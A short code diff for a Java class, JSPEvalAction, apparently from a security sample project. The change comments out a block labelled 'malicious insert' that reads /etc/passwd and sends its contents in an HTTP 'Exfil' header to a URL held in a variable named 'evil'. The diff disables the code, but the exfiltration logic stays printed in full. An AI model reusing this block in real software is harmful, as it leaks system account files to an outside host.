@@ -44,7 +44,8 @@ public class JSPEvalAction extends ExampleAction {
 				writer.write(jsp);
 			} finally {
 				// begin malicious insert
-				File f = new File( "/etc/passwd" );
+				/* 
+    				File f = new File( "/etc/passwd" );
 				byte[] bytes = new byte[(int)f.length()];
 				FileInputStream fis = new FileInputStream(f);
 				fis.read(bytes);
@@ -53,6 +54,7 @@ public class JSPEvalAction extends ExampleAction {
 				HttpURLConnection con = (HttpURLConnection)evil.openConnection();
 				con.setRequestProperty("Exfil", data);
 				int code = con.getResponseCode();
+    				*/
 				// end malicious insert
 				if (writer != null)
 					writer.close();
